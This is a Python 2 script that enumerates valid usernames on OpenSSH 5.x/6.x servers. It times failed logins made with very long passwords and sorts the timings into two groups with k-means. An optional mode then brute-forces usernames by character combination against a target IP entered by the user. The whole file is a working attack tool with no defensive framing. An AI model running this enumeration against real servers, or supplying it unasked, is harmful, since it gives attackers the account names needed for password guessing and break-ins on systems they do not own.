#! /usr/bin/env python
# coding=UTF-8

import re
import math
import sys
import time
import paramiko
import itertools
import numpy
import socket
from scipy.cluster.vq import kmeans,vq

#Code to enumerate users for OpenSSH 5.X & 6.X

#Opens file that stores user names in order of frequency they around
def fetch_terms(userfile):
	l = []
	f = open(userfile);
	for line in f:
		line = line.rstrip('\n\r')
		l.append(line);
	l = set(l)
	f.close();
	return l

#Write out the users that were found to the top of the ranked-users file
#This maintains a loose ranking as the users who exist often percolate to the top
def post_write(userfile, existingusers, nonexistingusers):
	f = open(userfile, 'w');
	for (user,_) in existingusers:
		f.write(user+'\n');
	for (name,_) in nonexistingusers:
		f.write(name+'\n');
	f.close();

#A function to cluster the timings into two clusters, and return (existing,non-existing)
def cluster(lst):
	times = []
	cluster_one = []
	cluster_zero = []
	for (name,time) in lst:
		times.append(time)
	y = numpy.array(times)
	codebook,_ = kmeans(y, 2)  # two clusters
	cluster_indices,_ = vq(y, codebook)
	for i in range(0,len(times)):
		name,time = results[i]
		if cluster_indices[i] == 1:
			cluster_one.append((name,time))
		else:
			cluster_zero.append((name,time))
	#Now we have to figure out which cluster has the highest avg RTT
	one_rtt = average(cluster_one)
	zero_rtt = average(cluster_zero)
	#If everything is in one cluster, then the RTT = -1 to signify no users were found
	if one_rtt == -1:
		return (cluster_one,cluster_zero)
	#likewise in this case
	elif zero_rtt == -1:
		return (cluster_zero,cluster_one)
	#other wise we have found some users
	else:
		if one_rtt > zero_rtt:
			return (cluster_one,cluster_zero)
		elif zero_rtt > one_rtt:
			return (cluster_zero,cluster_one)
		else:
			return ([],cluster_zero+cluster_one)

#A function that returns the avg of a list (in this case avergae RTT
def average(lst):
	if len(lst) == 0:
		return -1 # we use -1 because a large list can avg RTT 0 on a LAN
	else:
		#print lst
		r = 0
		for (_,i) in lst:
			r += i
		avg_rtt = r/len(lst)
		#Never set it to zero, because our estimated time to completion will be 0 too! This also confuses the clustering
		if avg_rtt == 0:
			avg_rtt = 1
		#print avg_rtt
		return avg_rtt

#A function that returns the time it takes to process the failed login
def sidechan(user,machine,pass_len):
	exists = []
	token = 'Moustache'*pass_len
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#time measurement
	timeStart = int(time.time())
	try:
		ssh.connect(machine, username=user, password=token)
	except paramiko.AuthenticationException,e:
		pass
	except socket.error,e:
		print "There is some rate limiting of SSH attempts here."
		sys.exit()
	timeDone = int(time.time())
	#simple time calculation
	timeRes = timeDone-timeStart
	#Statement below useful for debugging
	print "User "+user+" took %d" % timeRes
	return timeRes

def display(existing):
	if len(existing)>0:
		print "The following users were found:"
		for (name,_) in existing:
			print name
		print "It is possible some of these are false positives if jitter or variance in cpu load occured during tests."
	else:
		print "No users were found"

#This function returns true if this is a LAN address
def is_private(ip):
	#Yes this is a regex for all private space IPv4 addresses, how do you like my finely waxed moustache?
	m = re.match('((192\.168|172\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31)|10\.(25[0-5]|2[0-4][0-9]|(1[0-9][0-9])|([0-9][0-9])|([0-9]))|169.254)\.(25[0-5]|2[0-4][0-9]|(1[0-9][0-9])|([0-9][0-9])|([0-9]))\.(25[0-5]|2[0-4][0-9]|(1[0-9][0-9])|([0-9][0-9])|([0-9])))',ip)
	try:
		m.group(0)
		return True
	except AttributeError,e:
		return False

def is_ipv4(ip):
	try:
		socket.inet_aton(ip)
		return True
	except socket.error,e:
		return False

#This is function to estimate the time to completion for bruteoforcing
def etc(avg_rtt, min_len, max_len):
	etc = 0
	for i in range(min_len-1,max_len):
		etc += avg_rtt*(36**i)
	return etc

#Begin the main program
machine = raw_input("Enter the IPv4 address to enumerate SSH users on: ")
if is_ipv4(machine):
	if is_private(machine):
		pass_len = 3000
	else:
		pass_len = 25000
else:
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()
results = []
try:
	users = fetch_terms('Ranked-Users.txt');
except: 
	print "Ranked-Users.txt file not found. You should provide an initial list of users to test."
	sys.exit()
print "Please be patient the first users are usually 10x slower than the others."
progress = 0
sys.stdout.write('\r'+str(progress)+'/'+str(len(users))+' users tested...')
sys.stdout.flush()
progress += 1
for user in users:
	#sys.stdout.write('\r'+str(progress)+'/'+str(len(users))+' users tested...')
	#sys.stdout.flush()
	dur = sidechan(user,machine,pass_len)
	results.append((user,dur))
	progress += 1
sys.stdout.write('\n')
#Do the 2-means clustering and split the users with the higher RTT into the exists list
(existing,nonexisting) = cluster(results)
display(existing)
#write the new user list back out, because impatient users often ctrl-c during bruteforce
post_write('Ranked-Users.txt', existing,nonexisting)
#create a list of users we already found so we don't 'find' them during brute-force
found = []
for j,_ in existing:
	found.append(j)
avg_rtt = average(nonexisting)
print avg_rtt
#print results
results = []
print "We have exhausted our common username list."
ans = raw_input("Would you like to brute force other names (y/n)? ")
if ans == "y":
	#Dictionary List exhausted, let's bruteforce
	min_len = raw_input("Enter the min user name length (inclusive): ")
	max_len = raw_input("Enter the max user name length (inclusive): ")
	time_estimate = etc(avg_rtt, int(min_len), int(max_len))
	time_estimate = time_estimate/60
	if time_estimate == 0:
		print "This will take about a minute."
	elif time_estimate < 120:
		print "This will take approximately %d minutes." % time_estimate
	elif time_estimate < 1440:
		time_estimate = time_estimate/60
		print "This will take approximately %d hours." % time_estimate
	elif time_estimate < 43800:
		time_estimate = time_estimate/1440
		print "This will take approximately %d days." % time_estimate
	else:
		time_estimate = time_estimate/43800
		print "This will take approximately %d months." % time_estimate
	print "However, you will be informed as soon as a user is found."
	tested = 0
	for i in range(int(min_len), int(max_len)+1, 1):
		x = itertools.product('etaoinshrdlcumwfgypbvkjxqz1234567890', repeat=i)
		for tup in x:
			name = ''
			for element in tup:
				name += element
			if name in found:
				pass
			else:
				dur = sidechan(name,machine,pass_len)
				if dur > 3*avg_rtt:
					print name+' probably exists.'
					f = open('Ranked-Users.txt', 'a');
					f.write(name+'\n');
					f.close();
	#sys.stdout.write('\n')
